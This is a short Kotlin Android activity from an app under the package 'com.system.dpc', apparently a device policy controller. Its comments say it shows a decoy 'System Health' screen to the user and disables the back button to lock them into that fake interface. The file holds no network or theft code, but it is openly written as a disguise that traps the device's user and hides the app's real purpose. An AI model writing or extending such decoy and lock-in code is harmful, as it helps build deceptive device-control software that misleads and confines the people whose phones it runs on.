package com.system.dpc

import android.os.Bundle
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity

/**
 * MainActivity acts as the Decoy UI for the DPC.
 * It presents a static "System Health" interface to the user
 * and disables navigation to prevent exiting the launcher.
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Disable the Back Button via the OnBackPressedDispatcher
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Do nothing: effectively locking the user into the Decoy UI
            }
        })
    }

    override fun onResume() {
        super.onResume()
        // Ensure the decoy UI is always clean and low-memory
        window.statusBarColor = android.graphics.Color.BLACK
    }
}